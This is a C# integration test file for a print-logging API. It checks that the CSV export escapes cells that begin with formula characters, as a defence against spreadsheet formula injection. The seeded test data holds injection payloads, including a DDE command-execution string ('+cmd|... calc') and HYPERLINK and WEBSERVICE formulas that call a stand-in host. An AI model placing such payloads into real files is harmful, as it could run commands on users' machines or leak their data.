using System.Globalization;
using CsvHelper;
using PrintLogApi.Models;
using PrintLogApi.Services;
using Xunit;
using static PrintLogApi.Models.Print;

namespace PrintLogApi.IntegrationTests.Services;

/// <summary>
/// The print CSV export opens in spreadsheets, which run a cell that starts with <c>=</c>, <c>+</c>,
/// <c>-</c>, <c>@</c>, a tab or a carriage return as a formula. Titles, notes, URLs and printer and
/// filament names come from users, connectors and file names, so those text columns get a leading
/// apostrophe when they start with one of those characters. Numbers and dates are never touched, so
/// they stay numeric in the spreadsheet.
/// </summary>
public class PrintCsvFormulaEscapingTests(CustomWebApplicationFactory factory)
    : IClassFixture<CustomWebApplicationFactory>
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    [Fact]
    public async Task TextColumns_StartingWithAFormulaCharacter_AreEscaped()
    {
        var userId = await SeedAsync(
            printer: ("=1+1", "@SUM(A1)", "-2+3"),
            prints:
            [
                ("=HYPERLINK(\"https://example.test/?\"&A1,\"open\")", "--- Slicer settings (OrcaSlicer 2.2.0) ---\nLayer Height: 0.2", "=WEBSERVICE(\"https://example.test\")", "+PLA"),
                ("+cmd|' /C calc'!A0", "+5 mm brim", "@home", "=PETG"),
                ("@SUM(1,2)", "\rcarriage", "\tindent", "-ASA"),
            ]);

        var rows = await ExportAsync(userId);

        Assert.Equal(
            ["'@SUM(1,2)", "'+cmd|' /C calc'!A0", "'=HYPERLINK(\"https://example.test/?\"&A1,\"open\")"],
            rows.Select(r => r["Title"]));
        Assert.All(rows, r => Assert.Equal("'=1+1", r["Printer Name"]));
        Assert.All(rows, r => Assert.Equal("'@SUM(A1)", r["Printer Make"]));
        Assert.All(rows, r => Assert.Equal("'-2+3", r["Printer Model"]));
        Assert.Equal(["'\rcarriage", "'+5 mm brim", "'--- Slicer settings (OrcaSlicer 2.2.0) ---\nLayer Height: 0.2"], rows.Select(r => r["Notes"]));
        Assert.Equal(["'\tindent", "'@home", "'=WEBSERVICE(\"https://example.test\")"], rows.Select(r => r["Url"]));
        Assert.Equal(["'-ASA", "'=PETG", "'+PLA"], rows.Select(r => r["Filament Type"]));
    }

    [Fact]
    public async Task OrdinaryText_NumbersAndEmptyCells_AreUnchanged()
    {
        var userId = await SeedAsync(
            printer: ("Ender 3", "Creality", "V2 = Neo"),
            prints:
            [
                ("Benchy - 0.2 mm", null, null, null),
                ("a=b+c", "Note with = and - inside", "https://example.test/print", "PLA"),
            ]);

        var rows = await ExportAsync(userId);

        Assert.Equal(["a=b+c", "Benchy - 0.2 mm"], rows.Select(r => r["Title"]));
        Assert.All(rows, r => Assert.Equal("Ender 3", r["Printer Name"]));
        Assert.All(rows, r => Assert.Equal("V2 = Neo", r["Printer Model"]));
        Assert.Equal(["Note with = and - inside", ""], rows.Select(r => r["Notes"]));
        Assert.Equal(["https://example.test/print", ""], rows.Select(r => r["Url"]));
        Assert.Equal(["PLA", ""], rows.Select(r => r["Filament Type"]));
        Assert.All(rows, r => Assert.Equal("60", r["Print Time (s)"]));
        Assert.All(rows, r => Assert.Equal("Success", r["Status"]));
        Assert.All(rows, r => Assert.StartsWith("0", r["Start Date"], StringComparison.Ordinal));
    }

    private async Task<long> SeedAsync(
        (string Name, string Make, string Model) printer,
        (string Title, string? Notes, string? Url, string? FilamentType)[] prints)
    {
        using var scope = factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<PrintLogContext>();
        var user = new User
        {
            OAuthUserId = $"auth0|csv-{Guid.NewGuid():N}",
            DisplayName = "Csv",
            Email = $"csv-{Guid.NewGuid():N}@example.test",
        };
        db.Users.Add(user);
        await db.SaveChangesAsync(Ct);

        var entity = new Printer { Name = printer.Name, Make = printer.Make, Model = printer.Model, UserId = user.Id, IsActive = true };
        db.Printers.Add(entity);
        await db.SaveChangesAsync(Ct);

        for (var i = 0; i < prints.Length; i++)
        {
            var (title, notes, url, filamentType) = prints[i];
            db.Prints.Add(new Print
            {
                Title = title,
                Notes = notes,
                Url = url,
                FilamentType = filamentType,
                PrinterId = entity.Id,
                Status = PrintStatus.Success,
                ViewStatus = PrintViewStatus.Private,
                // Later prints start later, so the export (newest first) lists them in reverse.
                StartDate = new DateTimeOffset(2026, 1, 1 + i, 0, 0, 0, TimeSpan.Zero),
                PrintTimeInSeconds = 60,
                CreatedById = user.Id,
                UpdatedById = user.Id,
            });
        }
        await db.SaveChangesAsync(Ct);
        return user.Id;
    }

    private async Task<List<Dictionary<string, string>>> ExportAsync(long userId)
    {
        using var scope = factory.Services.CreateScope();
        var printService = scope.ServiceProvider.GetRequiredService<IPrintService>();
        await using var destination = new MemoryStream();
        await printService.WritePrintReportAsCsvForUser(userId, destination, Ct);

        destination.Position = 0;
        using var reader = new StreamReader(destination);
        using var csv = new CsvReader(reader, CultureInfo.InvariantCulture);
        await csv.ReadAsync();
        csv.ReadHeader();
        var header = csv.HeaderRecord!;
        var rows = new List<Dictionary<string, string>>();
        while (await csv.ReadAsync())
        {
            rows.Add(header.ToDictionary(h => h, h => csv.GetField(h)!));
        }
        return rows;
    }
}
